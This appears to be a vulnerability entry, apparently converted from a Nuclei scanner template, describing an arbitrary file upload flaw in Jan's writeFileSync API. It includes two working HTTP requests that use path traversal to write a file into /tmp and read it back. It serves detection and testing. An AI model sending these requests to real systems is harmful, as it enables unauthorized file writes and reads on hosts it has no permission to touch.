# Vulnerability: Jan - Arbitrary File Upload
**Classification:** JAN
**Source:** Nuclei Template (`jan-file-upload.yaml`)

## Description
Jan's API interface writeFileSync and appendFileSync does not filter parameters, resulting in an arbitrary file upload vulnerability.

## Vulnerable Code Pattern / Exploit Payload
```http
POST /v1/app/writeFileSync HTTP/1.1
Host: {{Hostname}}
contentType: application/json
Content-Type: text/plain;charset=UTF-8
Origin: {{RootURL}}

["/../../../../../tmp/{{string}}.txt","{{randstr}}"]

POST /v1/app/readFileSync HTTP/1.1
Host: {{Hostname}}
contentType: application/json
Content-Type: text/plain;charset=UTF-8
Origin: {{RootURL}}

["file:/../../../../../tmp/{{string}}.txt","utf-8"]
```

